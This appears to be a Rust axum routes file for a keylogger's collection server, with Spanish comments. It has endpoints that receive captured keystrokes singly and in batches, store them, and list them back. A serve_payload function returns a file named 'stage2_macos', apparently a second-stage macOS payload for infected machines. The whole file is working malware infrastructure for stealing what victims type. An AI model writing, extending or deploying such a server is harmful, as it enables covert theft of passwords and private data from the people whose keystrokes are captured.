// routes.rs
use axum::{
    extract::State,
    http::StatusCode,
    response::Json,
    routing::{get, post},
    Router,
};
use std::sync::Arc;
use crate::storage::Storage;

pub fn create_routes(storage: Storage) -> Router {
    Router::new()
        .route("/keys", post(receive_key))
        .route("/keys/batch", post(receive_keys_batch))  // <--- AGREGAR ESTA LÍNEA
        .route("/keys", get(get_keys))
        .with_state(Arc::new(storage))
}

// Recibir una tecla individual
pub async fn receive_key(
    State(storage): State<Arc<Storage>>,
    Json(payload): Json<serde_json::Value>,
) -> StatusCode {
    storage.add(payload);
    StatusCode::CREATED
}

// NUEVO: Recibir múltiples teclas en un solo request
pub async fn receive_keys_batch(
    State(storage): State<Arc<Storage>>,
    Json(payloads): Json<Vec<serde_json::Value>>,
) -> StatusCode {
    println!("📦 Recibiendo {} teclas en lote", payloads.len());
    for payload in payloads {
        storage.add(payload);
    }
    StatusCode::CREATED
}

// Obtener todas las teclas
pub async fn get_keys(
    State(storage): State<Arc<Storage>>,
) -> Json<Vec<serde_json::Value>> {
    Json(storage.get_all())
}

// Servir payload
pub async fn serve_payload() -> Vec<u8> {
    std::fs::read("./payloads/stage2_macos").unwrap_or_default()
}
